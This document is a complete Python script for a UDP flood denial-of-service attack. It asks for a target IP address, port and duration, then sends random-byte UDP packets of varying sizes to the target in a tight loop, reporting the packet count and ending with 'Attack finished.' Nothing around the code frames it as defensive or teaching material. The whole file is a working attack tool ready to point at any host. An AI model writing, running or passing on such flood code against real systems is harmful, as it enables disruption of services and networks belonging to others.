import socket
import random
import time

target_ip = input("ip: ")
target_port = int(input("port: "))
duration = int(input("duration: "))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

packet_sizes = [32, 64, 128, 256, 512, 1024, 2048, 4096]
bytes = random._urandom(1024)

timeout = time.time() + duration
sent = 0

while True:
    if time.time() > timeout:
        break
    else:
        pass
    sock.sendto(bytes, (target_ip, target_port))
    sent += 1
    size = random.choice(packet_sizes)
    bytes = random._urandom(size)
    print("Sent %s packets to %s:%s." % (sent, target_ip, target_port))

print("Attack finished.")
